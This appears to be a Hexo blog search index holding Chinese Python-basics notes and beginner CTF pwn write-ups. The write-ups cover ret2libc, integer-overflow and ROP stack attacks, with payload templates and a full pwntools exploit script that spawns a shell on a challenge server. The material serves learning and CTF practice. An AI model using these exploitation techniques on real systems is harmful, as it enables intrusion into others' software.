<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Python noob</title>
    <link href="/2022/03/23/Python-noob/"/>
    <url>/2022/03/23/Python-noob/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-学习之路"><a href="#Python-学习之路" class="headerlink" title="Python 学习之路"></a>Python 学习之路</h1><p><strong><del>登神长阶</del></strong><br>笔者有C++基础，但在Python上还是noob一只。</p><h2 id="0x0-Python初见"><a href="#0x0-Python初见" class="headerlink" title="0x0 Python初见"></a>0x0 Python初见</h2><h3 id="Python是一种解释型语言"><a href="#Python是一种解释型语言" class="headerlink" title="Python是一种解释型语言"></a>Python是一种解释型语言</h3><p>与C语言对比，Python无需编译，而是执行时，通过解释器一行一行地进行解释。  </p><h3 id="Python是面向对象的语言"><a href="#Python是面向对象的语言" class="headerlink" title="Python是面向对象的语言"></a>Python是面向对象的语言</h3><p>与C++一样。  </p><h3 id="可拓展性"><a href="#可拓展性" class="headerlink" title="可拓展性"></a>可拓展性</h3><blockquote><p>如果你需要一段运行很快的关键代码，或者是想要编写一些不愿开放的算法，你可以使用C或C++完成那部分程序，然后从你的Python程序中调用。  </p></blockquote><h3 id="可嵌入性"><a href="#可嵌入性" class="headerlink" title="可嵌入性"></a>可嵌入性</h3><blockquote><p>你可以将Python嵌入到C/C++程序，让你的程序的用户获得”脚本化”的能力。</p></blockquote><h3 id="速度性能"><a href="#速度性能" class="headerlink" title="速度性能"></a>速度性能</h3><blockquote><p>若想程序运行得更快，用C++改写关键部分</p></blockquote><h2 id="0x01-Python环境配置"><a href="#0x01-Python环境配置" class="headerlink" title="0x01 Python环境配置##"></a>0x01 Python环境配置##</h2><h3 id="安装Python环境"><a href="#安装Python环境" class="headerlink" title="安装Python环境"></a>安装Python环境</h3><blockquote><p><a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a><br>下载Download Windows installer (64-bit)<br>记得勾选add path选项。</p></blockquote><h3 id="Pycharm-运行Python"><a href="#Pycharm-运行Python" class="headerlink" title="Pycharm 运行Python"></a>Pycharm 运行Python</h3><blockquote><p><a href="https://www.jetbrains.com/pycharm/download/">https://www.jetbrains.com/pycharm/download/</a><br>下载Pycharm</p></blockquote><h2 id="0x02-Python3-基础语法"><a href="#0x02-Python3-基础语法" class="headerlink" title="0x02 Python3 基础语法"></a>0x02 Python3 基础语法</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>默认utf-8编码，unicode字符串。</p><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p><strong>第一个字符不能是数字，只能是字母表中字母或下划线_</strong><br>其余与C++相同。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>以#开头，如</p><blockquote><p>#this is my file</p></blockquote><p>也可以用”””或’’’</p><blockquote><p>‘’’<br>注释<br>注释<br>‘’’</p><p>“””<br>注释<br>注释<br>“””</p></blockquote><h3 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h3><p>python最具特色的就是用缩进表示代码块，不要用大括号{}<br>缩进空格数可变，但同一个代码块必须包含相同的缩进空格数。</p><blockquote><p>if True:<br> print(“true”)<br> print(“1111”)<br>else:<br> print(“false”)</p><h2 id="the-following-part-will-not-be-allowed"><a href="#the-following-part-will-not-be-allowed" class="headerlink" title="the following part will not be allowed"></a>the following part will not be allowed</h2><p>if True:<br>  print(“111”)<br> print(“not allowed”)</p></blockquote><h3 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h3><p>Python可以用\实现多行语句</p><blockquote><p>total = item_one + <br>     item_two + <br>     item_three</p><p>在[], {} , ()中的多行语句，不需要\ 如：<br>total = {‘it’,’it3’<br>     ‘it2’}</p></blockquote><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p>Python中有四种类型：整形，bool，float，复数。</p><blockquote><p>int (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。<br>bool (布尔), 如 True。<br>float (浮点数), 如 1.23、3E-2<br>complex (复数), 如 1 + 2j、 1.1 + 2.2j</p></blockquote><p>注：float型中，如1.23，3E-2.<br>3E-2是3*10的负二次方的意思。</p><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>** Python中单引号<code>&#39;&#39;</code>与双引号<code>&quot;&quot;</code>的使用完全相同</p><p>转义符<code>\</code>.<br>使用r让反斜杠不转义。如 <strong>r”this is line of words\n”</strong> 此时<code>\n</code>会显示，而非换行。</p><p>字符串可用<code>+</code>链接，用<code>*</code>重复数次。<br>Python中字符串有两种索引方式，从左往右以<code>0</code>开始，从右往左以<code>-1</code>开始。<br>Python 中的字符串不能改变。<br>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。<br>字符串的截取的语法格式如下：<strong>变量[头下标:尾下标:步长]</strong><br><strong>关于Python字符串的下标，跟C++有出入</strong></p><blockquote><p>a= “123456”<br>print(a[0:1])<br>#会打印1<br>print(a[0:0])<br>#什么都不会打印出来</p></blockquote><h3 id="等待用户输入"><a href="#等待用户输入" class="headerlink" title="等待用户输入"></a>等待用户输入</h3><p>执行下面程序，会在回车键后等待用户输入</p><blockquote><p>input(“按下 enter 键后退出”)</p></blockquote><h3 id="同一行显示多条语句"><a href="#同一行显示多条语句" class="headerlink" title="同一行显示多条语句"></a>同一行显示多条语句</h3><p>语句间用<code>;</code>分割。</p><blockquote><p>import sys; x = ‘runoob’; sys.stdout.write(x + ‘\n’)</p></blockquote><h3 id="代码组"><a href="#代码组" class="headerlink" title="代码组"></a>代码组</h3><p>缩进相同的一组语句构成一个代码块，称之为代码组。<br>如if，while，def这种复合语句，首行以<code>:</code>结束，此行开始后的一行或多行构成代码组。</p><h3 id="print输出"><a href="#print输出" class="headerlink" title="print输出"></a>print输出</h3><p><strong>print</strong>输出是默认换行的，若要禁止换行，需要在print第二个参数写上<code>end = &quot;&quot;</code></p><blockquote><p>x= “a”<br>y = “b”<br>#换行<br>print(x)<br>#不换行<br>print(y,end = “”)<br>print()</p></blockquote><h3 id="import-与-from-import"><a href="#import-与-from-import" class="headerlink" title="import 与 from  import"></a>import 与 from  import</h3><p>导入整个模块，格式为：import somemodule<br>导入某模块中全部函数：from pwn import*<br>（导入pwntools的所有函数）<br>从模块中导入函数：from somemodule import func1，func2</p><h2 id="0x03-Python3-基本数据类型"><a href="#0x03-Python3-基本数据类型" class="headerlink" title="0x03 Python3 基本数据类型"></a>0x03 Python3 基本数据类型</h2><p>python中变量不需要声明类型（与C++不同）<br><del>所以</del>每个变量使用前都必须赋值，才能创建。<br><code>=</code>为赋值号，如<code>a = 1</code>就是给变量a赋值为1，a是整型变量。</p><h3 id="多变量赋值"><a href="#多变量赋值" class="headerlink" title="多变量赋值"></a>多变量赋值</h3><p>规则：从后向前。<br>如</p><blockquote><p>a = b = c = 1</p></blockquote><p>就是c先被赋值为1，再b、a。  </p><p>也可以对应式多变量赋值。</p><blockquote><p>a, b, c = 1, 2, “new booob”</p></blockquote><p>就是a = 1;b = 2; c = “new booob”的效果。  </p><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><p>Python3 中有六个标准数据类型：</p><ol><li>Number（数字）</li><li>String （字符串）</li><li>List （列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ol><p>Python3的六个标准数据类型中：<br>Number，String，Tuple   为不可变数据。<br>List，Dictionary，Set   为可变数据。</p><h3 id="Number详解"><a href="#Number详解" class="headerlink" title="Number详解"></a>Number详解</h3><p><strong>int,float,bool,complex.</strong><br>注：内置type()函数可以查询变量所指对象类型</p><blockquote><p>&gt;&gt;&gt; a, b, c, d = 20, 5.5, True, 4+3j<br>&gt;&gt;&gt; print(type(a), type(b), type(c), type(d))<br>&lt;class ‘int’&gt; &lt;class ‘float’&gt; &lt;class ‘bool’&gt; &lt;class ‘complex’&gt;</p></blockquote><p>注：<code>//</code>双除号会得到一个整数（仅仅保留整数部分，如1.9保留为1）<br>一个变量可以通过赋值指向不同类型的对象。<br>混合计算时，Python会将整型转化为浮点数。</p><h3 id="String字符串"><a href="#String字符串" class="headerlink" title="String字符串"></a>String字符串</h3><p>截取：</p><blockquote><p>变量[头下标:尾下标]</p></blockquote><p><img src="/2022/03/23/Python-noob/p1.svg"></p><p>可见，其与C++的索引模式有点区别，小心搞混力。<br><strong>与C字符串不同的是，Python字符串不能被改变。对一个索引位置赋值是错误的！！</strong><br><strong>w[0]就会报错</strong></p><p>总结：<br>1、反斜杠可以用来转义，使用r可以让反斜杠不发生转义。<br>2、字符串可以用+运算符连接在一起，用*运算符重复。<br>3、Python中的字符串有两种索引方式，从左往右以0开始，从右往左以-1开始。<br>4、Python中的字符串不能改变。</p><h3 id="List-（列表）"><a href="#List-（列表）" class="headerlink" title="List （列表）"></a>List （列表）</h3><p>List（列表）是Python中使用最频繁的数据类型。<br>可以看作一个混合数组，其中各个元素类型可以互不相同。<br>创建方式</p><blockquote><p>list1 = [“a”, 100 , 12.5, b]</p><p>列表的截取语法与字符串相同：<br>变量[头下标:尾下标]     </p></blockquote><p><img src="/2022/03/23/Python-noob/p2"></p><blockquote><p>print(list1[0])     #输出列表第一个元素<br>print(list1[1:3])  #输出列表第2，3个元素<br>print(list1[1:])   #输出列表第二个元素开始的所有元素</p></blockquote><p>注：列表也是可以链接的。</p><p>与Python字符串不同，列表中元素可以改变</p><p><strong>索引的理解方式</strong>：<br>与C++一样的部分：从0号元素开始。<br>不同：左闭右开，即[start_index:end_index]中，start_index是取得到的，end_index是取不到的</p><p><strong>如[1:3]就是位置为1，第二个元素会取到，但位置为3，第四个元素不会取到，也就是对第2到3，这两个元素进行操作！！！</strong></p><p>总结：<br>1、List写在方括号之间，元素用逗号隔开。<br>2、和字符串一样，list可以被索引和切片。<br>3、List可以使用+操作符进行拼接。<br>4、List中的元素是可以改变的。</p><h3 id="Tuple（元组）"><a href="#Tuple（元组）" class="headerlink" title="Tuple（元组）###"></a>Tuple（元组）###</h3><p>元组与列表相似，不同之处在于元组的元素<strong>不能修改</strong>。<br>元组写在小括号<code>()</code>内，元素之间用逗号分割。</p><blockquote><p>tup = (1,2,3,4,5)#Tuple<br>list1 = [1,2,3,4,5]#List</p></blockquote><p>虽然tuple元素不可修改，但是它可以包含可变的对象，如list列表。<br><img src="/2022/03/23/Python-noob/p3.png" alt="可见，元组中list的元素可以被修改"><br>当构造包含0个或1个元素的元组时，有额外的语法规则：</p><blockquote><p>tup0 = ()<br>tup1 = (1,)#一个元素，要在元素后面打逗号</p></blockquote><p>string，list，tuple都属于sequence（序列）。</p><p>总结：</p><p>1、与字符串一样，元组的元素不能修改。<br>2、元组也可以被索引和切片，方法一样。<br>3、注意构造包含 0 或 1 个元素的元组的特殊语法规则。<br>4、元组也可以使用+操作符进行拼接。</p>]]></content>
    
    
    
    <tags>
      
      <tag>embrace Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>basic usage of libc</title>
    <link href="/2022/03/22/basic-usage-of-libc/"/>
    <url>/2022/03/22/basic-usage-of-libc/</url>
    
    <content type="html"><![CDATA[<h1 id="libc的基本用法"><a href="#libc的基本用法" class="headerlink" title="libc的基本用法"></a>libc的基本用法</h1><h2 id="题目来源：XCTF-PWN-新手区-level3"><a href="#题目来源：XCTF-PWN-新手区-level3" class="headerlink" title="题目来源：XCTF-PWN-新手区-level3"></a>题目来源：XCTF-PWN-新手区-level3</h2><h2 id="0下"><a href="#0下" class="headerlink" title="0下"></a>0下</h2><h2 id="0x1-基本分析"><a href="#0x1-基本分析" class="headerlink" title="0x1 基本分析"></a>0x1 基本分析</h2><p>32-bit elf文件</p><p>NX保护开启</p><p>32位IDA下，仅有一个read溢出点</p><p>栈溢出方式获取system权限</p><h2 id="0x2-找到突破口"><a href="#0x2-找到突破口" class="headerlink" title="0x2 找到突破口"></a>0x2 找到突破口</h2><p>没有任何后门函数，没有调用system函数<br><br>但是题目给出了libc_32.so.6文件<br><br>思路如下：<br><strong>利用题目中调用的write函数，打印自身got表地址，通过write函数与libc基址的offset值，获得libc基址，从而调用libc中的内容（libc中既有system函数又有/bin/sh字符串）</strong></p><p>构建exp脚本如下：<br><img src="/2022/03/22/basic-usage-of-libc/p1.png" alt="exp脚本"></p><ol><li>完成136大小的buf字符串数组溢出和32位下saved_register  ebp的溢出</li><li>用write函数地址覆盖返回地址，以调用write函数。</li><li>布置栈帧，此处覆盖意义为，write函数的返回地址，覆盖为main函数地址，准备第二次溢出。</li><li>布置栈帧，write函数的参数。（通过此处获取got地址）</li></ol><p><br>\</p><p>第二次溢出，覆盖后调用system(“/bin/sh”)<br>完成本题。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><ol><li>用elf = ELF(“./file”)的形式调用文件内，自有的函数的plt、got地址。</li><li>32位的题，用布置栈帧方法。</li><li>打印出来的got地址，用u32方法解码后，是该函数在libc中的真实地址。</li><li>用libc.symbols[“func”]的方法获取函数func相对基址的offset。</li><li>二次溢出，达到一次拿地址，二次打通的效果。</li><li>教科书式的题值得多次揣摩！</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>create /bin/sh</title>
    <link href="/2022/03/20/create-bin-sh/"/>
    <url>/2022/03/20/create-bin-sh/</url>
    
    <content type="html"><![CDATA[<h1 id="当目标有调用system函数，但无-bin-sh字符串时"><a href="#当目标有调用system函数，但无-bin-sh字符串时" class="headerlink" title="当目标有调用system函数，但无/bin/sh字符串时"></a>当目标有调用system函数，但无/bin/sh字符串时</h1><p>xctf pwn新手区最后三题之一，cgpwn2.</p><p>打开IDA乍一看，没有后门函数，没有明显的可导向的返回地址。</p><p><img src="/2022/03/20/create-bin-sh/bin1.png"></p><p>关注有两个读取输入的地方，一个是有限制大小的读取函数，另一个是gets()这个危险函数。</p><p>考虑到这题只开启了NX保护，栈溢出应该是必须的。</p><p>于是，思路是通过name字符串，导入“/bin/sh”字符串。</p><p>再通过gets()溢出，传入_system函数地址，最后传入/bin/sh。</p><p>\</p><blockquote><p>payload = b’a’*42 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>上面是脚本中核心语句。</p><p>b’a’*42 填充字符串和ebp</p><p>后面传入system函数地址替换原有返回地址，以调用system函数。</p><p>进入system函数后，因为这里是32位程序，推荐用布置栈帧的方式传参。</p><p>也就是，调用system后，此时位于system函数栈的ebp顶部。</p><p>需要传入一个4字节的数据，填充返回地址，然后来到传入的参数部分。</p><p>将/bin/sh 字符串的地址传入，完成传参。</p><p>达到调用system(“/bin/sh”)的目的。</p><p>劫持到程序，cat flag拿到答案。</p><p>总结下，第一眼看上去没法溢出，是因为忽略了通过传参的手段，构造一个system(“/bin/sh”)的可能性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xctf int_overflow整数类型的溢出</title>
    <link href="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="整数类型的溢出"><a href="#整数类型的溢出" class="headerlink" title="整数类型的溢出"></a>整数类型的溢出</h2><p>以xctf平台的pwn新手区int_overflow为例<br>into 为rename的elf文件</p><h3 id="0X1"><a href="#0X1" class="headerlink" title="0X1"></a>0X1</h3><blockquote><p>file into<br>chmod 777 into<br>./into</p></blockquote><p>先确定into为32位elf文件</p><h3 id="0X2"><a href="#0X2" class="headerlink" title="0X2"></a>0X2</h3><p>win环境下，32位IDA进行分析<br>有明显的后门函数what_is_this()<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png" alt="no1"><br>进入login()后<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic2.png" alt="no2"><br>结合下图看看<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic3.png" alt="no3"><br><br>首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越界。<br>唯一的落脚点来到strcpy()上，但是，s被限制再4到8个字节大小内，如果想达到栈溢出，覆盖返回地址，却至少需要读取大于dest数组0x14大小的填充数据。<br><strong>这个时候，unsigned __int8 v3是突破口</strong><br>查资料得知，int8的意思是占8个bit，因为是无符号数，范围是0到255之间。<br>回顾一下，check_passwd()函数传入的buf长度，有0x199这么大，足矣我们完成对int8的溢出。<br>截至目前，思路为，将buf的长度控制在256+4~256+8之间，达到v3&gt;3&amp;&amp;v3&lt;=8的条件，同时通过这两百五十多字节的数据布置，完成程序的劫持。<br>编写exp脚本如下</p><blockquote><p>from pwn import*<br>p = remote(“ip_address”,port)<br>p.recv()<br>p.sendline(‘1’)<br>p.recv()<br>p.sendline(‘kawa’)<br>p.recv()<br>payload = b’a’*(0x14) + b’aaaa’ + p32(0x804868b) + b’a’*234<br>p.sendline(payload)<br>p.interactive()</p></blockquote><p>linux中</p><blockquote><p>python3 e.py<br>[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.<br>[+] Opening connection to 111.200.241.244 on port 65136: Done<br>/root/Desktop/e.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘1’)<br>/root/Desktop/e.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘fc’)<br>[*] Switching to interactive mode<br>Hello fc</p></blockquote><p>Please input your passwd:<br>Success<br>cyberpeace{c592ce35706a19933e58ca21a03fb3c8}<br>[*] Got EOF while reading in interactive<br>$  </p><p>结束</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p><strong>本题重点是需要知道，int8是内存大小为8bit即1字节大小的空间，可以达到int类型溢出。否则无从下手！！！</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NX-ROP</title>
    <link href="/2022/03/02/NX-ROP/"/>
    <url>/2022/03/02/NX-ROP/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是NX与ROP"><a href="#什么是NX与ROP" class="headerlink" title="什么是NX与ROP"></a>什么是NX与ROP</h1><p><strong>NX即为no execute bit，即禁止执行位</strong><br><br>以下是wiki中文的解释</p><blockquote><p>支持NX技术的系统会把内存中的区域分类为只供存储处理器指令集与只供存储数据使用的两种。任何标记了NX位的区块代表仅供存储数据使用而不是存储处理器的指令集，处理器将不会将此处的数据作为代码执行，以此这种技术可防止多数的缓存溢出式攻ji（即一些恶意程序把自身的恶意指令集通过特殊手段放在其他程序的存储区并被执行，从而攻ji甚至控制整台电脑系统）。</p></blockquote><p>个人理解就是不能用常规的最简单的栈溢出手段，来直接修改返回地址为目标函数地址。<br><br><strong>ROP即返回导向编程（英语：Return-Oriented Programming，缩写：ROP）</strong><br>其核心思想是通过栈溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>因为开启了NX 保护，我们不可以把shellcode放到栈上来执行了，因此我们就需用用到ROP技术来迂回获得SHELL。</strong><br><br><br><strong>++本文是学习笔记形式，许多内容与原文章相同，但会加入部分个人理解。因为自学ctf确实费劲，一个地方搞不懂会困扰几天，希望我个人对样例的复现过程，和我的经验能帮助到后来者，少走弯路。++</strong><br><br><strong>原文地址</strong></p><blockquote><p><a href="https://bbs.pediy.com/thread-221041.htm">https://bbs.pediy.com/thread-221041.htm</a></p></blockquote><p>再次感谢原文大佬作者！</p><h2 id="win的IDA-pro与虚拟机中的linux联合调试方法"><a href="#win的IDA-pro与虚拟机中的linux联合调试方法" class="headerlink" title="win的IDA pro与虚拟机中的linux联合调试方法"></a>win的IDA pro与虚拟机中的linux联合调试方法</h2><p>1.在IDA中选中remote linux debugger<br><br>2.在菜单debugger下拉菜单里选择process option选项，设置如下：<br><img src="/2022/03/02/NX-ROP/cto1.png" alt="test-png"><br>其中目录就选择rop所在目录，hostname填上linux虚拟机的ip，端口默认选择23946<br><br>3.然后打开linux虚拟机，并把ida目录下的linxu_serverX64拷贝到虚拟机里并执行<br><img src="/2022/03/02/NX-ROP/cto2.png" alt="image.png"></p><p><br>4.用py编写调试代码rexp.py如下：<br><br> <br>#! /usr/bin/python<br>from pwn import *<br>import pdb<br>context.log_level = ‘debug’<br>target = process(‘./rop’)<br>elf=ELF(‘./rop’) #这个会显示rop用了哪些保护技术<br>pdb.set_trace()#这里设置一个pdb断点，可以让ida附加rop进程<br><br><br>target.sendline(‘a’64+’b’8+’c’*8)<br>target.interactive()<br>5.然后在linux系统上新开一个终端，执行rexp.py如下<br><img src="/2022/03/02/NX-ROP/cto3.png" alt="image.png"><br><br>6.在ida vuln函数里的gets函数后面下好断点<br><br>7.然后点击debugger,附加远程进程，找到./rop打开<br><img src="/2022/03/02/NX-ROP/cto4.png" alt="image.png"><br>并按F9执行<br><br>8.回到linux中，在Pdb终端里面输入n并回车（即next，下一步的意思)<br><br>9.可以看见IDA中出现同步的动态调试信息。<br><br><strong>以上便是IDA与linux的联合调试过程</strong><br><br>\</p><h2 id="开启NX保护与不开启时，做题时的不同感受"><a href="#开启NX保护与不开启时，做题时的不同感受" class="headerlink" title="开启NX保护与不开启时，做题时的不同感受"></a>开启NX保护与不开启时，做题时的不同感受</h2><p>1.开启NX以后，最直接的效果就是不能在栈上执行shellcode，也就是不能直接通过溢出，修改返回地址为shellcode，来获得shell。<br>2.但是开启NX以后，可以修改返回地址为已有的backdoor函数得到shell。<br>3.如果没有现成的backdoor函数，则需要我们想办法转移到其他空间，执行shellcode。</p><h2 id="64位与32位下，简单的应对NX保护的方式"><a href="#64位与32位下，简单的应对NX保护的方式" class="headerlink" title="64位与32位下，简单的应对NX保护的方式"></a>64位与32位下，简单的应对NX保护的方式</h2><p>即构造ROP链<br>1.64位环境下，一般先搜索有类似“pop rdi ; ret;”形式的代码段<br>命令：</p><blockquote><p>ROPgadget –binary 文件名 | grep “pop rdi”</p></blockquote><p>找到相关代码段后，payload第一部分覆盖缓冲区和rbp（ebp）后，便接上ROPgadget找到的gadget地址。<br>为什么要寻找pop rdi呢？<br>因为函数第一个参数一般都存在rdi中，这样可以达到传参的目的。<br>再寻找”/bin/sh”字符串地址，链接在rop链后。<br>随后传入_system函数地址，作用是，通过ret指令，跳转至该地址，执行system()<br>此时rdi已经被设置好为”/bin/sh”，即会执行system(“/bin/sh”)<br>获得系统权限。<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*8 + p64(pop_rdi_addr) + p64(/bin/sh_addr) + p64(_system_addr)</p></blockquote><p>2.32位环境下一般采用布置栈帧，达到调用函数、传递参数的目的<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*4 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>首先，覆盖完缓冲区后，为了达到返回地址处，要覆盖ebp，ebp的大小是4个字节。<br>然后通过修改返回地址，进入system函数，此时我们位于system函数栈帧中的ebp处，我们需要填充一下ebp下面的返回地址，随便设置为0x0.<br>紧接着导入/bin/sh字符串，达到传参的目的。</p><p><br>以上便是本人对NX及ROP技术初次认识的浅显简介，让各位见笑了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>start</title>
    <link href="/2022/02/23/start/"/>
    <url>/2022/02/23/start/</url>
    
    <content type="html"><![CDATA[<h2 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>test_new_site</title>
    <link href="/2022/02/23/test-new-site/"/>
    <url>/2022/02/23/test-new-site/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/02/23/hello-world/"/>
    <url>/2022/02/23/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
